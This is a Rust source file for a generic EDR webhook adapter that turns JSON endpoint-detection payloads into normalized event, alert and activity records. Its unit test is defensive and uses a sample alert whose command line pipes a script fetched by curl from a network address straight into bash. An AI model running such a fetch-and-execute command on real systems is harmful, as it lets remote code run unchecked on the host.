use anyhow::Result;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::time::{SystemTime, UNIX_EPOCH};

use crate::connectors::traits::EDRAdapter;
use crate::model::edr::{EDRAlert, EDREvent};
use crate::model::event::NormalizedEvent;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EDRWebhookEnvelope {
    pub adapter: String,
    pub payload: Value,
}

#[derive(Debug, Clone, Default)]
pub struct GenericWebhookAdapter;

impl EDRAdapter for GenericWebhookAdapter {
    fn name(&self) -> &'static str {
        "generic"
    }

    fn normalize_event(&self, payload: &Value) -> Result<Option<EDREvent>> {
        let event_name = payload
            .get("event_name")
            .and_then(Value::as_str)
            .unwrap_or("generic_event")
            .to_string();
        let observed_at = payload
            .get("observed_at")
            .and_then(Value::as_i64)
            .unwrap_or_else(now_unix_seconds);
        let unique_key = payload
            .get("event_id")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| {
                payload
                    .get("process_guid")
                    .and_then(Value::as_str)
                    .map(|guid| format!("{guid}:{observed_at}:{event_name}"))
            })
            .unwrap_or_else(|| format!("{}:{observed_at}", self.name()));

        Ok(Some(EDREvent {
            id: format!("edr:event:{}:{}", self.name(), unique_key),
            vendor: "generic".to_string(),
            adapter_name: self.name().to_string(),
            external_event_id: payload
                .get("event_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            host_id: payload
                .get("host_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            agent_id: payload
                .get("agent_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            hostname: payload
                .get("hostname")
                .and_then(Value::as_str)
                .map(str::to_string),
            process_guid: payload
                .get("process_guid")
                .and_then(Value::as_str)
                .map(str::to_string),
            pid: payload.get("pid").and_then(Value::as_i64),
            ppid: payload.get("ppid").and_then(Value::as_i64),
            exe_path: payload
                .get("exe_path")
                .and_then(Value::as_str)
                .map(str::to_string),
            cmdline: payload
                .get("cmdline")
                .and_then(Value::as_str)
                .map(str::to_string),
            file_path: payload
                .get("file_path")
                .and_then(Value::as_str)
                .map(str::to_string),
            src_ip: payload
                .get("src_ip")
                .and_then(Value::as_str)
                .map(str::to_string),
            dst_ip: payload
                .get("dst_ip")
                .and_then(Value::as_str)
                .map(str::to_string),
            dst_port: payload.get("dst_port").and_then(Value::as_i64),
            severity: payload
                .get("severity")
                .and_then(Value::as_i64)
                .map(|v| v as i32),
            event_name,
            observed_at,
            raw_event_id: None,
            normalized_event_id: None,
        }))
    }

    fn normalize_alert(&self, payload: &Value) -> Result<Option<EDRAlert>> {
        let alert_name = payload
            .get("alert_name")
            .and_then(Value::as_str)
            .unwrap_or("generic_alert")
            .to_string();
        let observed_at = payload
            .get("observed_at")
            .and_then(Value::as_i64)
            .unwrap_or_else(now_unix_seconds);
        let unique_key = payload
            .get("alert_id")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| {
                payload
                    .get("process_guid")
                    .and_then(Value::as_str)
                    .map(|guid| format!("{guid}:{observed_at}:{alert_name}"))
            })
            .unwrap_or_else(|| format!("{}:{observed_at}", self.name()));

        Ok(Some(EDRAlert {
            id: format!("edr:alert:{}:{}", self.name(), unique_key),
            vendor: "generic".to_string(),
            adapter_name: self.name().to_string(),
            external_alert_id: payload
                .get("alert_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            host_id: payload
                .get("host_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            hostname: payload
                .get("hostname")
                .and_then(Value::as_str)
                .map(str::to_string),
            alert_name,
            severity: payload.get("severity").and_then(Value::as_i64).unwrap_or(5) as i32,
            status: payload
                .get("status")
                .and_then(Value::as_str)
                .unwrap_or("open")
                .to_string(),
            process_guid: payload
                .get("process_guid")
                .and_then(Value::as_str)
                .map(str::to_string),
            pid: payload.get("pid").and_then(Value::as_i64),
            tactic_tags_json: None,
            summary: payload
                .get("summary")
                .and_then(Value::as_str)
                .map(str::to_string),
            observed_at,
            raw_event_id: None,
        }))
    }

    fn normalize_activity(
        &self,
        payload: &Value,
        raw_event_id: &str,
    ) -> Result<Option<NormalizedEvent>> {
        let observed_at = payload
            .get("observed_at")
            .and_then(Value::as_i64)
            .unwrap_or_else(now_unix_seconds);
        let event_name = payload
            .get("event_name")
            .and_then(Value::as_str)
            .unwrap_or("generic_event");
        let category = if payload.get("file_path").is_some() {
            "file"
        } else if payload.get("dst_ip").is_some() || payload.get("dst_port").is_some() {
            "network"
        } else {
            "process"
        };
        let action = payload
            .get("action")
            .and_then(Value::as_str)
            .unwrap_or(event_name)
            .to_string();

        Ok(Some(NormalizedEvent {
            id: format!(
                "normalized:edr:{}:{}:{}:{}",
                self.name(),
                event_name,
                observed_at,
                raw_event_id
            ),
            raw_event_id: Some(raw_event_id.to_string()),
            source_kind: "edr".to_string(),
            vendor: Some("generic".to_string()),
            category: category.to_string(),
            action,
            host_id: payload
                .get("host_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            agent_id: payload
                .get("agent_id")
                .and_then(Value::as_str)
                .map(str::to_string),
            hostname: payload
                .get("hostname")
                .and_then(Value::as_str)
                .map(str::to_string),
            process_guid: payload
                .get("process_guid")
                .and_then(Value::as_str)
                .map(str::to_string),
            pid: payload.get("pid").and_then(Value::as_i64),
            ppid: payload.get("ppid").and_then(Value::as_i64),
            uid: payload.get("uid").and_then(Value::as_i64),
            gid: payload.get("gid").and_then(Value::as_i64),
            user_name: payload
                .get("user_name")
                .and_then(Value::as_str)
                .map(str::to_string),
            exe_path: payload
                .get("exe_path")
                .and_then(Value::as_str)
                .map(str::to_string),
            comm: payload
                .get("comm")
                .and_then(Value::as_str)
                .map(str::to_string),
            cmdline: payload
                .get("cmdline")
                .and_then(Value::as_str)
                .map(str::to_string),
            cwd: payload
                .get("cwd")
                .and_then(Value::as_str)
                .map(str::to_string),
            file_path: payload
                .get("file_path")
                .and_then(Value::as_str)
                .map(str::to_string),
            file_hash: payload
                .get("file_hash")
                .and_then(Value::as_str)
                .map(str::to_string),
            src_ip: payload
                .get("src_ip")
                .and_then(Value::as_str)
                .map(str::to_string),
            src_port: payload.get("src_port").and_then(Value::as_i64),
            dst_ip: payload
                .get("dst_ip")
                .and_then(Value::as_str)
                .map(str::to_string),
            dst_port: payload.get("dst_port").and_then(Value::as_i64),
            protocol: payload
                .get("protocol")
                .and_then(Value::as_str)
                .map(str::to_string),
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            severity: payload
                .get("severity")
                .and_then(Value::as_i64)
                .map(|v| v as i32),
            confidence: payload
                .get("confidence")
                .and_then(Value::as_f64)
                .map(|v| v as f32),
            observed_at,
            tags_json: payload.get("tags").map(|v| v.to_string()),
        }))
    }
}

fn now_unix_seconds() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_secs() as i64)
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::GenericWebhookAdapter;
    use crate::connectors::traits::EDRAdapter;

    #[test]
    fn generic_adapter_normalizes_unique_event_and_activity_ids() {
        let adapter = GenericWebhookAdapter;
        let payload = json!({
            "event_name": "edr_process_alert",
            "alert_name": "suspicious_bash",
            "host_id": "blue-host",
            "hostname": "blue",
            "pid": 4242,
            "process_guid": "proc-guid-1",
            "cmdline": "bash -c curl http://10.0.0.5/payload.sh | bash",
            "severity": 8,
            "observed_at": 1718611205,
            "summary": "sample edr alert"
        });

        let event = adapter
            .normalize_event(&payload)
            .expect("normalize event should succeed")
            .expect("event should exist");
        let alert = adapter
            .normalize_alert(&payload)
            .expect("normalize alert should succeed")
            .expect("alert should exist");
        let normalized = adapter
            .normalize_activity(&payload, "raw:edr:generic:test-1")
            .expect("normalize activity should succeed")
            .expect("normalized event should exist");

        assert!(
            event
                .id
                .contains("proc-guid-1:1718611205:edr_process_alert")
        );
        assert!(alert.id.contains("proc-guid-1:1718611205:suspicious_bash"));
        assert_eq!(normalized.source_kind, "edr");
        assert_eq!(normalized.category, "process");
        assert!(normalized.id.contains("raw:edr:generic:test-1"));
    }
}
